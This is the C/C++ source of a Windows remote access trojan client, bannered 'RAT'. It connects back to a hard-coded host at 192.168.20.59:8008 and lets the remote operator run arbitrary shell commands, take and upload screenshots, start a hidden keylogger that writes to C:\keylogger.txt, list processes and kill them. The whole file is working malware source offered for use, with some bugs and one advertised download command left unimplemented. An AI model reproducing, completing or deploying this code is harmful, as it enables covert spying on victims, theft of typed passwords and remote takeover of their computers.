#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>
#include <winsock2.h>
#include <gdiplus.h>
#include <string.h>
#include <wingdi.h>
#include <iostream>
#include <conio.h>
#include <fstream>
#include <ctype.h>
#include <tlhelp32.h>

using namespace Gdiplus;

#pragma comment(lib,"gdiplus.lib")
#define BUFFER_SIZE 10240
#define TRUE 1
#define LOG_FILE "C:\\keylogger.txt"

SOCKET initSocket(char* SERVER_IP, int PORT) {
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddress;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    // Create socket
    if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        return 1;
    }

    // Prepare the server address structure
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddress.sin_port = htons(PORT);

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        return 1;
    }

    printf("Connected to the server.\n");
    return clientSocket;
}
void sendData(SOCKET clientSocket, const char* buff)
{
	send(clientSocket, buff, strlen(buff), 0);
}

void recvData(SOCKET clientSocket, char* buff)
{
	recv(clientSocket, buff, BUFFER_SIZE, 0);
}

//----------------------------------------------------------------HELPER 
void redirectHelper(SOCKET clientSocket)
{
	char buff[BUFFER_SIZE] = { 0 };

	sprintf(buff, "\n%s \n%s \n%s \n%s \n%s \n%s" \
		"cmd			execute command"
		"scr            screenshot"
		"klg            keylogger"
		"lpc            list running processes"
		"kpc            kill a process"
		"df             download a file"
		);

	sendData(clientSocket, buff);
}

void CMDHelper(SOCKET clientSocket)
{
	char buff[BUFFER_SIZE] = { 0 };

	sprintf(buff, "%s\n", \
		"exit		terminate CMD Worker" \
	);

	sendData(clientSocket, buff);
}

void helper(SOCKET clientSocket, const char* worker)
{
	if (!strcmp(worker, "REDIRECT"))
		redirectHelper(clientSocket);
	
}

//---------------------------------------------------------------- CMD WORKER 
void CMDWorker(SOCKET clientSocket)
{
	FILE* pPipe;
	int oldLen;
	char buff[BUFFER_SIZE] = { 0 }, * buffSend;

	while (recv(clientSocket, buff, BUFFER_SIZE, 0))
	{
		if (!strcmp(buff, "?"))
			helper(clientSocket, "CMD");
		else if (!strcmp(buff, "EXIT"))
		{
			sendData(clientSocket, "CMD Worker terminated!");
			break;
		}
		else
		{
			buffSend = (char*)calloc(1, 1);
			strcat(buff, " 2>&1");
			if ((pPipe = _popen(buff, "rt")) == 0)
			{
				sendData(clientSocket, "Error command!");
				continue;
			}

			while (fgets(buff, BUFFER_SIZE, pPipe))
			{
				oldLen = strlen(buffSend);
				buffSend = (char*)realloc(buffSend, oldLen + strlen(buff) + 1);
				strcat(buffSend, buff);
			}
			sendData(clientSocket, buffSend);
			free(buffSend);
		}
		memset(buff, 0, BUFFER_SIZE);
	}
}

//---------------------------------------------------------------- SCREENSHOT
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

void SCREENSHOTWorker(SOCKET clientSocket, char* pathSave)
{
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
	HBITMAP hbmScreen = NULL;

	const size_t pathLength = strlen(pathSave) + 1;
	wchar_t* pathSaveWideChar = new wchar_t[pathLength];
	mbstowcs(pathSaveWideChar, pathSave, pathLength);

	GdiplusStartupInput gdip;
	ULONG_PTR gdipToken;
	GdiplusStartup(&gdipToken, &gdip, NULL);

	hbmScreen = CreateCompatibleBitmap(hdcScreen, 1718, 928);
	SelectObject(hdcMemDC, hbmScreen);

	BitBlt(hdcMemDC,0, 0, 1718, 928, hdcScreen, 0, 0, SRCCOPY);

	CLSID encoderID;

	GetEncoderClsid(L"image/png", &encoderID);

	Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(hbmScreen, (HPALETTE)0);
	bmp->Save(pathSaveWideChar, &encoderID, NULL);

	Gdiplus::GdiplusShutdown(gdipToken);
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	// Save file screenshot on client side
	FILE* fileSend = fopen("C:\\screenshot.png", "rb");
	if (fileSend == NULL) {
		printf("Error opening file\n");
	}
	// Send the file data
	char bufferSend[1024];
	int bytesReadSend;
	while ((bytesReadSend = fread(bufferSend, 1, sizeof(bufferSend), fileSend)) > 0) {
		int sendResult = send(clientSocket, bufferSend, bytesReadSend, 0);
		if (sendResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
		}
	}

}

//----------------------------------------------------------------KEYLOGGER
// Save data into log file
void saveData(const char* data) {
    FILE* logFile;

    // Open file
    logFile = fopen(LOG_FILE, "a");

    // Write data to log file
    fprintf(logFile, "%s", data);

    // Close file
    fclose(logFile);
}

// Translate special key int into string
const char* translateSpecialkey(int key) {
    switch (key) {
        case VK_SPACE:
            // Space key
            return " ";
        case VK_RETURN:
            // New line key
            return "\n";
        case VK_BACK:
            // Backspace key
            return "[BACKSPACE]";
        case VK_CAPITAL:
            // CapsLock key
            return "[CAPS_LOCK]";
        case VK_SHIFT:
            // Shift key
            return "[SHIFT]";
        case VK_TAB:
            // Tab key
            return "[TAB]";
        case VK_CONTROL:
            // Control key
            return "[Ctrl]";
        case VK_MENU:
            // Alt key
            return "[ALT]";
        default:
            return "";
    }
}

void keyLogger(){
	int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
    char specialKeyChar[20];
    bool isSpecialKey;
    char result[20];

    // Hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Loop forever
    while (true) {
        // Loop through each key
        for (int key = 8; key <= 190; key++) {
            // Check key pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Key is pressed
                // Check if key is special key
                isSpecialKey = false;
                for (int i = 0; i < sizeof(specialKeyArray); i++) {
                    if (specialKeyArray[i] == key) {
                        isSpecialKey = true;
                        break;
                    }
                }
                    // This is not a special key.
                    if (key > 32 && key <= 127){
                        sprintf(result, "%c", key);
                        saveData(result);
                    }
                    else {
                        // This is a special key. We need to translate it
                        const char* specialKeyChar = translateSpecialkey(key);
                        // Save data
                        saveData(specialKeyChar);
                    }
            }
        }
    }
}

//----------------------------------------------------------------LIST RUNNING PROCESS
void listProcesses(char* buffer, size_t buffer_size) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot\n");
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &processEntry)) {
        printf("Failed to get first process entry\n");
        CloseHandle(snapshot);
        return;
    }

    snprintf(buffer, buffer_size, "PID\t\tName\n");
    strncat(buffer, "--------------------------------\n", buffer_size);

    do {
        char line[BUFFER_SIZE];
        snprintf(line, sizeof(line), "%lu\t\t%s\n", processEntry.th32ProcessID, processEntry.szExeFile);
        strncat(buffer, line, buffer_size);
    } while (Process32Next(snapshot, &processEntry));

    CloseHandle(snapshot);
}

//----------------------------------------------------------------KILL A PROCESS
void killProcess(SOCKET clientSocket) {
	char buff [BUFFER_SIZE];
	sendData(clientSocket,"Enter PID of process to kill: ");
	if (recv(clientSocket, buff, BUFFER_SIZE, 0)){
		DWORD pid = atoi(buff);

		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
		if (hProcess == NULL) {
			perror("Failed to open process");
			return;
		}

		if (TerminateProcess(hProcess, 0)) {
			sendData(clientSocket, "Process terminated successfully.\n");
		} else {
			sendData(clientSocket, "Failed to terminate process");
		}
		CloseHandle(hProcess);
	}
	else {
		sendData(clientSocket, "Can't recieve PID");
	}
}



//----------------------------------------------------------------REDIRECT
void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot)
{
	char buff[BUFFER_SIZE] = { 0 };

	while (recv(clientSocket, buff, BUFFER_SIZE, 0))
	{
		if (!strcmp(buff, "?"))
			helper(clientSocket, "REDIRECT");
		else if (!strcmp(buff, "CMD"))
		{
			sendData(clientSocket, "CMD Worker started!");
			CMDWorker(clientSocket);
		}
		else if (!strcmp(buff, "SCR"))
		{
			SCREENSHOTWorker(clientSocket, pathSaveScreenshot);
			sendData(clientSocket, "Screenshot success! Save at C:\\screenshot.png");
		}
		else if (!strcmp(buff, "KLG")){
			sendData(clientSocket, "keyLogger start listening and save at C:\\keylogger.txt");
			keyLogger();
		}
		else if (!strcmp(buff, "LPC")){
			char buffer[BUFFER_SIZE];
			listProcesses(buffer, sizeof(buffer));

			if (send(clientSocket, buffer, strlen(buffer), 0) < 0) {
				perror("Sending data failed");
    		}
			sendData(clientSocket, "List Running Processes!");
		}
		else if (!strcmp(buff, "KPC")){
			killProcess(clientSocket);
		}

		memset(buff, 0, BUFFER_SIZE);
	}
}



int main(){
    char HOST[] = "192.168.20.59", pathSaveScreenshot[] = "C:\\screenshot.png";
    int PORT = 8008;

    SOCKET clientSocket;
    clientSocket = initSocket(HOST, PORT);

    const char *banner = 
        " *******       **     **********             **               **             \n"
        "/**////**     ****   /////**///             /**              /**              \n"
        "/**   /**    **//**      /**      ******   ******  ******   ******  ******       \n"
        "/*******    **  //**     /**     //////** ///**/  //////** ///**/  //////**      \n"
        "/**///**   **********    /**      *******   /**    *******   /**    *******      \n"
        "/**  //** /**//////**    /**     **////**   /**   **////**   /**   **////**     \n"
        "/**   //**/**     /**    /**    //********  //** //********  //** //********    \n"
        "//     // //      //     //      ////////    //   ////////    //   ////////      \n"
        "\n"
        "Please choose one option below !\n"
        "cmd        execute command \n"
		"scr        screenshot \n"
		"klg        keylogger \n"
		"lpc        list running processes \n"
		"kpc        kill a process \n"
		"df         download a file \n"
		;
    sendData(clientSocket, banner);

    redirectCmd(clientSocket, pathSaveScreenshot);
    
    return 0;
}

